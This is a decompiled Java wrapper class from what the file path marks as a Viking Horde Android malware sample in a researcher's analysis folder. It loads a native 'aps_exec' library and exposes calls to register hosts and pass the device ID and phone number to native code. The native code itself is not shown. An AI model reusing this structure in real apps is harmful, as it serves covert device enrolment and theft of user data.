package com.Jump.vikingJump;

public class NativeWrapper
{
  public NativeWrapper()
  {
    System.loadLibrary("aps_exec");
  }
  
  private native int AddHost(String paramString);
  
  private native int Run();
  
  private native int SetDeviceInfo(String paramString);
  
  private native int SetDeviceInfo2(byte paramByte1, byte paramByte2, byte paramByte3, byte paramByte4);
  
  private native int SetId(String paramString);
  
  private native int SetPhoneNumber(String paramString);
  
  private native int Start(String paramString);
  
  public int AddCpsHost(String paramString)
  {
    return AddHost(paramString);
  }
  
  public int RunCPS()
  {
    return Run();
  }
  
  public int SetDeviceId(String paramString)
  {
    return SetId(paramString);
  }
  
  public int SetInfo(String paramString)
  {
    return SetDeviceInfo(paramString);
  }
  
  public int SetInfo2(byte paramByte1, byte paramByte2, byte paramByte3, byte paramByte4)
  {
    return SetDeviceInfo2(paramByte1, paramByte2, paramByte3, paramByte4);
  }
  
  public int SetPhone(String paramString)
  {
    return SetPhoneNumber(paramString);
  }
  
  public int StartCPS(String paramString)
  {
    return Start(paramString);
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/viking-horde/classes.jar!/com/Jump/vikingJump/NativeWrapper.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */